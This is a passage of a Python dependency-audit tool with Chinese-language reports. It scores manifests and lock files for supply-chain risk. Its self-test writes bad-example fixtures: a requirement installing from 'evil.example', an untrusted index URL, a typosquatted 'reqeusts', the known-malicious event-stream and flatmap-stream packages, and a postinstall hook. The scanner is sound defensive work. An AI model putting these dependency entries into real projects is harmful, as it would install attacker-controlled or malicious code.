        agg[f.rule][2] += 1
    per_cat = {}
    for rule, (sev, cat, n) in agg.items():
        mult = min(n, 5) if rule in COUNTED_RULES else 1
        per_cat[cat] = per_cat.get(cat, 0) + SEV_W.get(sev, 0) * mult
    return min(sum(min(v, CAT_CAP) for v in per_cat.values()), 100), per_cat


def analyse(root: Path, online: bool, timeout: float, limit: int, blocklist_path=None):
    root = root.resolve()
    global BLOCKLIST
    if blocklist_path and Path(blocklist_path).is_file():
        try:
            extra = json.loads(Path(blocklist_path).read_text("utf-8"))
            for k in ("pypi", "npm"):
                BLOCKLIST[k] = set(BLOCKLIST.get(k, set())) | set(extra.get(k) or [])
        except Exception:
            pass

    manifests = [root] if root.is_file() else collect_manifests(root)
    deps, findings = [], []
    for m in manifests:
        low = m.name.lower()
        try:
            if low.startswith("requirements") or low in ("constraints.txt", "requirements.in"):
                parse_requirements(m, deps, findings)
            elif low == "pyproject.toml":
                parse_pyproject(m, deps, findings)
            elif low == "pipfile":
                parse_pipfile(m, deps, findings)
            elif low == "package.json":
                parse_package_json(m, deps, findings)
        except Exception as e:
            findings.append(Finding("parse_error", "low", "hygiene", "清单解析出错", "这个文件可能被跳过了。",
                                    m.name, 0, f"{type(e).__name__}: {e}"))

    locks = [] if root.is_file() else collect_locks(root)
    if not root.is_file():
        check_hygiene(manifests, locks, deps, findings, root)
    check_deps(deps, findings)

    # 传递依赖：锁文件里那些你从没看过，但会一起跑起来的包
    tree = parse_locks(locks, findings)
    direct_keys = {(d.kind, norm(d.name)) for d in deps}
    tree_checked = check_tree(tree, findings, direct_keys)

    rows = []
    if online and deps:
        rows = online_check(deps, findings, timeout, limit)

    ded, per_cat = compute_deduction(findings)
    has_crit = any(f.sev == "critical" for f in findings)
    grade, risk = grade_of(ded, has_crit)
    counts = {}
    for f in findings:
        counts[f.sev] = counts.get(f.sev, 0) + 1

    advice = ADVICE[grade]
    if not manifests and not locks:
        advice = ("没找到依赖清单（requirements.txt / pyproject.toml / package.json）"
                  "也没找到锁文件。确认一下目录是不是项目根目录。")
    elif not manifests and locks:
        advice = ("这个目录只有锁文件、没有清单文件。传递依赖已按锁文件审查完，"
                  "直接依赖部分建议连同清单一起看。")

    return {
        "root": str(root),
        "manifests": [str(m.relative_to(root.parent if root.is_file() else root))
                      if m.is_relative_to(root.parent if root.is_file() else root)
                      else str(m) for m in manifests],
        "dep_count": len({(d.kind, norm(d.name)) for d in deps}),
        "deps": [d.as_dict() for d in deps],
        "tree_count": len(tree),
        "tree_checked": tree_checked,
        "tree_sample": tree[:40],
        "locks": [p.name for p in locks],
        "online_rows": rows,
        "findings": [f.as_dict() for f in findings],
        "score": 100 - ded, "deduction": ded, "per_category": per_cat,
        "grade": grade, "risk": risk,
        "advice": advice,
        "sev_counts": counts,
        "online": online,
    }


def render_markdown(results, generated):
    L = ["# 依赖审查报告", "",
         f"- 生成时间：{generated}",
         f"- 工具：{APP_NAME} v{APP_VER}（只读清单，未安装任何依赖）",
         f"- 模式：{'联网核验 PyPI / npm' if results and results[0]['online'] else '离线（只用本地启发式）'}",
         ""]
    for r in results:
        L += [f"## {r['root']}", "",
              f"**等级 {r['grade']} · 风险 {r['risk']}**  ·  得分 {r['score']}/100  ·  "
              f"依赖 {r['dep_count']} 个", "",
              f"> {r['advice']}", "",
              f"清单文件：{', '.join('`' + m + '`' for m in r['manifests']) or '（未找到）'}",
              ""]
        if r["findings"]:
            L += ["### 扣分明细", "", "| 严重度 | 类别 | 问题 | 位置 |", "|---|---|---|---|"]
            for f in sorted(r["findings"], key=lambda x: SEV_ORDER.index(x["severity"])):
                loc = f"`{f['file']}:{f['line']}`" if f["line"] else f"`{f['file']}`"
                L.append(f"| {SEV_LABEL[f['severity']]} | {CATS.get(f['category'], '')} "
                         f"| {f['title']} | {loc} |")
            L += ["", "### 为什么在意", ""]
            for f in r["findings"]:
                if f["severity"] in ("critical", "high", "medium"):
                    L.append(f"- **{f['title']}** — {f['why']}"
                             + (f"（`{f['detail']}`）" if f["detail"] else ""))
            L.append("")
        else:
            L += ["未发现可疑项。", ""]

        if r["deps"]:
            L += ["### 依赖清单", "", "| 包 | 声明 | 类型 | 来源 | 文件 |", "|---|---|---|---|---|"]
            seen = set()
            for d in r["deps"]:
                k = (d["kind"], norm(d["name"]))
                if k in seen:
                    continue
                seen.add(k)
                L.append(f"| {d['name']} | `{d['spec']}` | {d['kind']} | {d['source']} "
                         f"| {d['file']} |")
            L.append("")
        if r.get("tree_count"):
            L += ["### 传递依赖", "",
                  f"锁文件（{', '.join(r.get('locks') or [])}）里共 {r['tree_count']} 条，"
                  f"其中 {r['tree_checked']} 条你没有在清单里直接声明 ， "
                  "这些包你看不见，但装的时候会一起跑。", ""]
            L += ["| 包 | 版本 | 由谁引入 |", "|---|---|---|"]
            for d in r.get("tree_sample") or []:
                L.append(f"| {d['name']} | {d.get('version') or '-'} | {d.get('via') or '-'} |")
            L.append("")
        if r["online_rows"]:
            L += ["### 在线核验", "", "| 包 | 仓库 | 版本 | 包年龄(天) | 状态 |", "|---|---|---|---|---|"]
            for row in r["online_rows"]:
                L.append(f"| {row['name']} | {row.get('registry')} | {row.get('version', '-')} "
                         f"| {row.get('pkg_age_days', '-')} | {row.get('status')} |")
            L.append("")

    L += ["---", "", "## 说明", "",
          "- 名单（高频包名 / 已确认恶意包）是**示例集**，不是全量。用 `--blocklist` 接自己的名单。",
          "- 名字像不像只用编辑距离判断，**差一个字符需要你人工确认**，可能是巧合。",
          "- 在线模式会把依赖名发给 pypi.org / npmjs.org（等于公开你的技术栈），介意就只用离线模式。",
          "- 静态审查防不住官方包被接管后投毒，但能防住绝大多数打错字、装到假包的情况。", ""]
    return "\n".join(L)


ANSI = {"critical": "\033[97;41m", "high": "\033[97;45m", "medium": "\033[30;43m",
        "low": "\033[30;46m", "info": "\033[90m"}
RESET, BOLD = "\033[0m", "\033[1m"
USE_COLOR = False


def c(text, key=None):
    return f"{ANSI.get(key, '')}{text}{RESET}" if (USE_COLOR and key) else text


def render_console(results, label):
    print()
    print(f"{BOLD if USE_COLOR else ''}{APP_NAME} · 依赖审查报告{RESET if USE_COLOR else ''}")
    print(f"目标: {label}")
    print("-" * 68)
    for r in results:
        print(f"\n目录 {r['root']}")
        print(f"  清单 {len(r['manifests'])} 个 · 依赖 {r['dep_count']} 个 · 得分 {r['score']}/100")
        print(f"  等级 {r['grade']}  ·  风险 {r['risk']}")
        if r.get("tree_count"):
            print(f"  传递依赖 {r['tree_count']} 条（其中 {r['tree_checked']} 条是你没直接声明的）")
        print(f"  {r['advice']}")
        counts = r["sev_counts"]
        if counts:
            print("  " + "  ".join(f"{c(SEV_LABEL[s], s)} {counts[s]}"
                                   for s in SEV_ORDER if counts.get(s)))
        hot = [f for f in r["findings"] if f["severity"] in ("critical", "high")][:10]
        if hot:
            print("  主要问题:")
            for f in hot:
                loc = f"  {f['file']}:{f['line']}" if f["line"] else f"  {f['file']}"
                print(f"    {c('●', f['severity'])} {f['title']}{loc}")
    print()
    print("-" * 68)


# ---------- 自检 ----------

def selftest():
    import shutil
    tmp = HERE / ".selftest"
    if tmp.exists() and (tmp / ".owner").is_file():
        shutil.rmtree(tmp, ignore_errors=True)
    good, bad = tmp / "good", tmp / "bad"
    good.mkdir(parents=True, exist_ok=True)
    bad.mkdir(parents=True, exist_ok=True)
    (tmp / ".owner").write_text("dep-audit selftest scratch\n", encoding="utf-8")

    (good / "requirements.txt").write_text(
        "fastapi==0.115.0\nuvicorn==0.32.0\nsqlalchemy==2.0.35\npydantic==2.9.2\n",
        encoding="utf-8")
    (good / "package.json").write_text(json.dumps({
        "name": "ok", "version": "1.0.0",
        "dependencies": {"vue": "3.5.12", "axios": "1.7.7"},
        "scripts": {"dev": "vite", "build": "vite build"},
    }, ensure_ascii=False, indent=2), encoding="utf-8")
    (good / "package-lock.json").write_text(json.dumps({
        "name": "ok", "lockfileVersion": 3,
        "packages": {
            "": {"name": "ok", "version": "1.0.0"},
            "node_modules/vue": {"version": "3.5.12",
                                 "resolved": "https://registry.npmjs.org/vue/-/vue-3.5.12.tgz",
                                 "integrity": "sha512-abc"},
            "node_modules/axios": {"version": "1.7.7",
                                   "resolved": "https://registry.npmjs.org/axios/-/axios-1.7.7.tgz",
                                   "integrity": "sha512-def"},
        },
    }, ensure_ascii=False, indent=2), encoding="utf-8")

    (bad / "requirements.txt").write_text(
        "python3-dateutil==2.8.2\n"
        "reqeusts>=2.0\n"
        "python-dotenv==1.0.1\n"
        "-e git+http://evil.example/x.git#egg=x\n"
        "--extra-index-url http://mirror.example/simple\n", encoding="utf-8")
    (bad / "package.json").write_text(json.dumps({
        "name": "bad", "version": "1.0.0",
        "dependencies": {"event-stream": "^3.3.6", "lodash": "*"},
        "scripts": {"postinstall": "node scripts/i.js"},
    }, ensure_ascii=False, indent=2), encoding="utf-8")
    (bad / "package-lock.json").write_text(json.dumps({
        "name": "bad", "lockfileVersion": 3,
        "packages": {
            "": {"name": "bad", "version": "1.0.0"},
            "node_modules/lodash": {"version": "4.17.21",
                                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
                                    "integrity": "sha512-ok"},
            "node_modules/reqeusts": {"version": "0.0.2",
                                      "resolved": "https://evil.example/dl.tgz"},
            "node_modules/flatmap-stream": {"version": "0.1.1",
                                            "resolved": "https://registry.npmjs.org/flatmap-stream/-/flatmap-stream-0.1.1.tgz",
                                            "integrity": "sha512-x",
                                            "hasInstallScript": True},
        },
    }, ensure_ascii=False, indent=2), encoding="utf-8")

    res = [analyse(good, False, 5, 0), analyse(bad, False, 5, 0)]
    print("\n== 依赖审查自检 ==")
    for r in res:
        print(f"{r['root']}: 等级 {r['grade']} 风险 {r['risk']} 得分 {r['score']} "
              f"依赖 {r['dep_count']} 命中 {len(r['findings'])} 条")
        for f in r["findings"][:6]:
            print(f"    - [{f['severity']}] {f['title']} @ {f['file']}:{f['line']}")
    g_ok = res[0]["grade"] == "A"
    b_ok = res[1]["grade"] == "D"
    squat_ok = any(f["rule"] == "typosquat" and "requests" in f["title"]
                   for f in res[1]["findings"])
    hook_ok = any(f["rule"] == "npm_postinstall" for f in res[1]["findings"])
    bl_ok = any(f["rule"] == "blocklist" for f in res[1]["findings"])
    tree_ok = res[1]["tree_count"] >= 3 and res[1]["tree_checked"] >= 1
    th_ok = any(f["rule"] == "tree_hook" for f in res[1]["findings"])
    host_ok = any(f["rule"] == "lock_host" for f in res[1]["findings"])
    clean_tree_ok = not any(f["category"] == "squat" for f in res[0]["findings"])
    print(f"\n干净清单判 A: {'通过' if g_ok else '失败'}")
    print(f"脏清单判 D: {'通过' if b_ok else '失败'}")
    print(f"识别山寨名 reqeusts: {'通过' if squat_ok else '失败'}")
    print(f"识别 npm postinstall: {'通过' if hook_ok else '失败'}")
    print(f"识别已知恶意包: {'通过' if bl_ok else '失败'}")
    print(f"读到传递依赖: {'通过' if tree_ok else '失败'}")
    print(f"认出传递依赖里的安装钩子: {'通过' if th_ok else '失败'}")
    print(f"认出锁文件里的非官方来源: {'通过' if host_ok else '失败'}")
    print(f"干净锁文件不误报: {'通过' if clean_tree_ok else '失败'}")
    ok = all([g_ok, b_ok, squat_ok, hook_ok, bl_ok, tree_ok, th_ok, host_ok, clean_tree_ok])
    print(f"\n自检{'全部通过' if ok else '失败'}。样本：{tmp}")
    return 0 if ok else 1


def main(argv=None):
    global USE_COLOR
    ap = argparse.ArgumentParser(prog="depaudit.py",
                                 description="依赖来源审查（只读清单，不安装任何包）")
    ap.add_argument("targets", nargs="*", help="要扫描的目录，默认 ../review-lab")
    ap.add_argument("--online", action="store_true", help="联网核验 PyPI / npm")
    ap.add_argument("--timeout", type=float, default=6.0, help="单次请求超时秒数")
    ap.add_argument("--max-online", type=int, default=60, help="最多核验多少个包")
    ap.add_argument("--blocklist", help="额外黑名单 JSON: {\"pypi\":[], \"npm\":[]}")
    ap.add_argument("--out", default=str(DEFAULT_OUT))
    ap.add_argument("--no-color", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)

    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass
    USE_COLOR = not args.no_color and os.name == "nt" or (not args.no_color and sys.stdout.isatty())

    if args.selftest:
        return selftest()

    targets = [Path(t) for t in args.targets] or [DEFAULT_TARGET]
    missing = [str(t) for t in targets if not t.exists()]
    if missing:
        print(f"路径不存在: {', '.join(missing)}", file=sys.stderr)
        return 3

    results = [analyse(t, args.online, args.timeout, args.max_online, args.blocklist)
               for t in targets]
    generated = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    md, js = out / f"依赖审查-{stamp}.md", out / f"依赖审查-{stamp}.json"
    md.write_text(render_markdown(results, generated), encoding="utf-8")
    js.write_text(json.dumps({"tool": f"{APP_NAME} {APP_VER}", "generated": generated,
                              "results": results}, ensure_ascii=False, indent=2),
                  encoding="utf-8")

    render_console(results, ", ".join(str(t) for t in targets))
    print(f"Markdown: {md}")
    print(f"JSON    : {js}\n")

    worst = min((r["grade"] for r in results), default="A")
    return {"A": 0, "B": 0, "C": 1, "D": 2}.get(worst, 0)


if __name__ == "__main__":
    sys.exit(main())
